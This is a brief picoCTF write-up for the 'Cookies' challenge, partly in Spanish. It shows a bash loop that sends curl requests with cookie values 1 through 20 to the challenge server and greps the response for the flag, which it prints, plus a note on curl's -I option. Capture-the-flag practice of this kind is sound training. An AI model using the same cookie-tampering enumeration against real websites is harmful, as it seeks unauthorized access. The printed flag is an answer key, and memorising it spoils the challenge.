# Cookies
# Objetivos
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:6418/](http://mercury.picoctf.net:6418/)

# Solucion
```bash

james-backster-picoctf@webshell:~$ for i in {1..20}; do curl -s  http://mercury.picoctf.net:6418/check -H "Cookie: name=$i"; done | grep pico 
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_88acab36}</code></p>

```

# Notas adicionales
|Comando|Descripcion|
|---|---|
|-I|es la nueva version de -X HEAD utilizando curl|

# Referencias
